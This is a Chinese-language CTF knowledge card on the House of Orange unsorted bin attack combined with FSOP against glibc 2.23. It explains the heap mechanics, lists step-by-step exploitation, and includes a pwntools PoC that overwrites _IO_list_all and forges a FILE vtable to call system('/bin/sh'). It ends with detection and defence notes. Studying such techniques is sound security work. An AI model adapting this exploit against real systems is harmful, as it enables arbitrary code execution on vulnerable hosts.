---
id: binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system
title: House of Orange 式 unsorted bin attack + FSOP：改 _IO_list_all 为 main_arena，借 0x60 smallbin 伪造 FILE vtable 调 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-orange-unsortedbin-attack-io-list-all-fake-file-system
aliases:
- House of Orange
- 橙色房子
- unsorted bin attack 改 _IO_list_all
- FSOP 伪造 FILE
- malloc_printerr 触发 FSOP
- _IO_flush_all_lockp
- mallopt 禁用 fastbin
tags:
- pwn
- heap
- glibc
- house-of-orange
- unsorted-bin
- unsorted-bin-attack
- fsop
- io-list-all
- vtable
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: glibc 2.23（Ubuntu 16.04；glibc 2.24+ 增加 _IO_vtable 校验，该 FSOP 路径需改用合法 vtable/其他手法）
verification:
  verified_by: verifier-V177
  verified_at: '2026-11-06T17:22:10+08:00'
  notes: 已对照原文核对；exp 未在本机复跑；affected_versions 按原文 glibc 2.23
---

## 一句话结论

在 glibc 2.23 的菜单堆题中（`mallopt(1,0)` 禁用 fastbin、无 tcache），先 free 大 chunk 从 unsorted bin 泄露 libc/heap，再把 unsorted chunk 的 `bk` 改成 `_IO_list_all - 0x10`，触发一次 `malloc` 让 unsorted bin attack 把 `main_arena+88` 写进 `_IO_list_all`；随后利用 `main_arena+88` 的 `chain` 字段落到 smallbin 的 0x60 chunk，在该 chunk 数据区伪造 FILE 并把 vtable 指向 `system`，程序 `exit` 时 `_IO_flush_all_lockp` 调用 `_IO_OVERFLOW` 执行 `system("/bin/sh")`。

## 原理

- **禁用 fastbin**：`mallopt(1, 0)` 把 `M_MXFAST` 设为 0，释放的小 chunk 不再进 fastbin；glibc 2.23 没有 tcache，因此大小合适的 free chunk 会进入 unsorted bin、small bin 或 large bin，后续 `malloc` 会遍历 unsorted bin 并按大小归位。
- **与经典 House of Orange 的区别**：经典手法在没有 free 功能时，靠伪造 top chunk size + 申请超大块触发 `sysmalloc`，把 old top `_int_free` 到 unsorted bin 以获得 unsorted chunk；本例有正常的 free，因此不走 top chunk 释放，而是直接 free 大 chunk 得到 unsorted bin 泄露与攻击面。top chunk 释放的四个断言条件（old_size ≥ MINSIZE、prev_inuse、old_end 页对齐、old_size < nb+MINSIZE）仍作为变体知识保留。
- **libc/heap 泄露**：释放大 chunk 后，其 `fd/bk` 指向 unsorted bin 头（`main_arena` 附近），`show` 读出即可算 libc；小 chunk 的 `fd/bk` 或 largebin 的 `fd_nextsize/bk_nextsize` 可给出堆地址。示例偏移：`libc = leak - 0x3c4f68`（另一处 `0x3c4b78`），`heap = leak - 0x1040`。
- **unsorted bin attack**：free 一个进入 unsorted bin 的 chunk（记 victim），通过 edit/UAF 把 `victim->bk` 改成目标地址 `target - 0x10`。下一次 `malloc` 从 unsorted bin 取出 victim 时，`bck = victim->bk`，执行 `bck->fd = unsorted_chunks(av)`，即 `*(target) = &unsorted_bin`（`main_arena+88`）。把 `target` 设为 `_IO_list_all`，全局 FILE 链表头就被改成 `main_arena+88`。
- **为什么不会先触发 malloc_printerr**：如果请求大小能由 unsorted bin 中的 victim 满足，glibc 会直接切割该 chunk，不会继续检查 `victim->bk` 指向的 fake chunk 的 size；若 unsorted bin 没有合适 chunk，遍历时会检查每个 chunk 的 `size <= 2*SIZE_SZ` 或 `> system_mem` 并调用 `malloc_printerr`。因此要选择能命中 unsorted chunk 的分配请求，或利用 `malloc_printerr` 本身的 `abort`/`_IO_flush_all_lockp` 路径。
- **构造 fake FILE**：`_IO_list_all` 现在指向 `main_arena+88`。该结构被当作 `_IO_FILE_plus`：`_mode` 在 +0xc0，`_chain` 在 +0x68；`main_arena+88+0x68` 恰好与 smallbin 的链字段重叠，指向被释放的 0x60 smallbin chunk。该 chunk 的用户数据由攻击者控制，可布置成第二个 fake FILE。
- **FSOP 条件**：`exit`/`main` 返回会调用 `_IO_flush_all_lockp`，对链表上每个 FILE 判断：
  `(mode <= 0 && _IO_write_ptr > _IO_write_base) || (vtable_offset == 0 && mode > 0 && wide_data->write_ptr > wide_data->write_base)`，
  满足则通过 vtable 调用 `_IO_OVERFLOW(fp, EOF)`。fake FILE 把 `mode=0`、`write_base=0`、`write_ptr=1`，并在 vtable 的 `__overflow` 槽（+0x18）放 `system`；第一个参数指向 `/bin/sh`。
- **1/2 概率**：第一个被遍历的 FILE 是 `main_arena+88`，其 `_mode` 取自 `main_arena+88+0xc0` 的 libc 数据；ASLR 下该 4 字节可能为负（>0x7fffffff 按有符号解释）也可能为正。为负时主 arena 这个假 FILE 也可能满足 flush 条件、用垃圾 vtable 调用而崩溃；为正时条件不满足，链表前进到 `_chain` 指向的 fake FILE，执行 system。成功概率约 1/2，失败重连即可。
- **vtable 布局**：exp 把 vtable 指针设为 `heap+0x110+0xf8-0x18`，在对应地址布置 `p64(0)*3 + p64(system)`，使 `_IO_OVERFLOW`（vtable+0x18）正好落到 `system`；glibc 2.23 没有 vtable 合法性校验，这是该手法成立的前提。

## 触发条件

- glibc 2.23（Ubuntu 16.04 等），没有 tcache；`mallopt(1,0)` 禁用 fastbin 不影响 unsorted/small/large bin。
- 有 add/delete/edit/show 一类菜单堆操作，能泄露 unsorted bin 指针并编辑已释放 chunk 的 `bk`。
- 能控制一个 0x60 smallbin chunk 的用户数据（free 后仍可 edit，或有 UAF/重叠）。
- 程序退出路径会调用 `_IO_flush_all_lockp`（`exit`、main 返回、`malloc_printerr` 等）。
- `_IO_list_all` 可写；glibc 2.24+ 的 vtable 校验会阻断直接伪造 vtable，需要另找合法 vtable 或改用其他 FSOP 变体。

## 利用步骤

1. 申请若干 0x400 大 chunk，free 其中几个制造 unsorted bin；申请稍小的 chunk 切割，`show` 读 `fd/bk` 得到 libc 与 heap（示例 `libc = leak - 0x3c4f68`、`heap = leak - 0x1040`）。
2. 在一个可控 chunk 内伪造后续要用的 chunk 头/`/bin/sh` 字符串和 fake FILE 布局（示例在 chunk 0 写入 `"/bin/sh\x00" + p64(0x61) + 0x50*0 + flat(0,0x61) + ...`）。
3. free 一个 0x100/0x200 的 chunk 使其进入 unsorted bin；通过 edit/悬空指针把它的 `bk` 改为 `libc + _IO_list_all - 0x10`，同时保留合法的 `size`。
4. 申请一个能由该 unsorted chunk 满足的块，触发 `bck->fd = unsorted_chunks(av)`，把 `_IO_list_all` 写成 `main_arena+88`。
5. 在 0x60 smallbin chunk 的数据区构造 fake FILE：`/bin/sh\x00`、`mode=0`、`write_base=0`、`write_ptr=1`，在 +0xd8 处放 vtable 指针（指向可控堆地址 -0x18），vtable+0x18 放 `system`。
6. 触发 `exit`/菜单退出，`_IO_flush_all_lockp` 遍历 `_IO_list_all`；若 `main_arena+88` 的 mode 为正，链到 fake FILE 并执行 `system("/bin/sh")`；为负则崩溃，重试直到成功（约 50%）。
7. 调试：在 `_IO_flush_all_lockp`、`_IO_OVERFLOW` 下断，核对 `_IO_list_all` 是否为 `main_arena+88`、`_chain` 是否指向 0x60 chunk、vtable+0x18 是否为 system。

## PoC

关键布局（基于 glibc 2.23 示例，未在本机复跑）：

```python
from pwn import *

# 1) 泄露
add(0x400, b'a') * 6           # 0..5
delete(2); delete(0); delete(4)
add(0x100, b'a'); add(0x100, b'a')   # 6,7
show(2); heap = u64(io.recv(6).ljust(8, b'\0')) - 0x1040
show(4); libc_base = u64(io.recv(6).ljust(8, b'\0')) - 0x3c4f68

# 2) 伪造 chunk 头 / bin/sh
fake  = b"/bin/sh\x00" + p64(0x61)
fake += b'\x00' * 0x50 + flat(0, 0x61)
fake += b'\x00' * 0x50 + flat(0, p64(0x301 - 0x60 - 0x60))
edit(0, b'a'*0x100 + fake)

# 3) unsorted bin attack -> _IO_list_all
delete(7)
add(0x200, b'a')              # 8
delete(8)
edit(8, flat(0, libc_base + libc.sym['_IO_list_all'] - 0x10))
add(0x400, b'a')              # 9，触发写 _IO_list_all = main_arena+88

# 4) fake FILE + vtable
fake  = b"/bin/sh\x00" + p64(0x61)
fake += p64(0) + p64(0)
fake += p64(0) + p64(1)       # write_base=0, write_ptr=1, mode=0
fake  = fake.ljust(0xd8, b'\x00')
fake += p64(heap + 0x110 + 0xf8 - 0x18)   # vtable - 0x18
fake += p64(0) * 3 + p64(libc_base + libc.sym['system'])  # __overflow => system
edit(0, b'a'*0x100 + fake)

# 5) 退出触发 _IO_flush_all_lockp -> system("/bin/sh")（约 1/2 概率）
choice_exit()
```

## 变体与关联

- **largebin attack 变体**：同一题也可不用 unsorted bin attack，而用 largebin attack 把堆 chunk 指针写到 `_IO_list_all`（glibc 2.23 低版本是“大 chunk 插入”路径，高版本是“小 chunk 插入”路径），再在堆上布置 fake FILE；示例 exp2 的流程与 exp1 类似，只是把 `_IO_list_all` 的写入源从 `main_arena+88` 换成 victim 堆指针。相关 largebin 机制见 [[binary-pwn-heap-largebin-attack-glibc231-middle-insert-checks]]、[[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]。
- **House of Peach**：无 free 函数时用 sysmalloc 释放 old top 伪造 unsorted/largebin，见 [[binary-pwn-heap-house-of-peach-top-chunk-sysmalloc-largebin]]；本卡的 top chunk 释放条件（old_size ≥ MINSIZE、prev_inuse、old_end 页对齐、old_size < nb+MINSIZE）可作为该手法的前置知识。
- **FSOP 变体**：glibc 2.24+ 引入 `_IO_vtable_check`，直接伪造 vtable 会失败；可改用合法 vtable（`_IO_wfile_jumps`/`_IO_str_jumps`）内的可控函数指针、wide FILE、`setcontext` 等，见 [[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]、[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]。
- **概率变体**：`main_arena+88` 的 `_mode` 符号导致约 1/2 成功率；可尝试调整布局让第一个假 FILE 必然不满足条件（如控制 `write_ptr <= write_base`），或改用其他链表入口降低随机性。

## 检测与防御

- **分配器/版本**：升级到 glibc 2.24+ 启用 `_IO_vtable_check`，并保持安全补丁；新版 glibc 的 tcache/safe-linking 也会改变利用面。
- **代码修复**：不要给已释放 chunk 保留 edit/写能力（UAF/重叠），严格校验 size/index；unsorted bin 的 `bk` 被改写应在 `malloc` 遍历时被完整性检查捕获（`malloc_printerr`）。
- **FSOP 防护**：监控 `_IO_list_all` 是否被写成 `main_arena` 附近或堆地址；对 `_IO_flush_all_lockp` 遍历到的 FILE 做 vtable 合法性校验；启用 Full RELRO/PIE 只能增加地址预测难度，不能阻止 FSOP。
- **检测特征**：`malloc_printerr("malloc(): memory corruption")` 后进程 abort 或异常 `sh` 子进程；`_IO_list_all` 指向 libc 的 `main_arena` 区域；0x60 smallbin chunk 中出现 `/bin/sh` 与伪造 vtable；堆块的 `bk` 指向 `_IO_list_all-0x10` 等全局变量附近。
